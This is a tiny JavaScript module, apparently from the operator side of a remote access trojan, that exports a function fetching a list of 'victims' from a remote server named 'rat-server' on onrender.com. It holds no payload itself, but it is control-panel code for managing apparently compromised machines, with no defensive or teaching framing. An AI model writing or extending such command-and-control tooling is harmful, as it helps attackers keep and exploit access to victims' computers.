const axios = require(`axios`).default

async function getVictims(){
    var victims = await axios.get(`https://rat-server-n24e.onrender.com/victims`)
    return victims.data
}

module.exports = getVictims
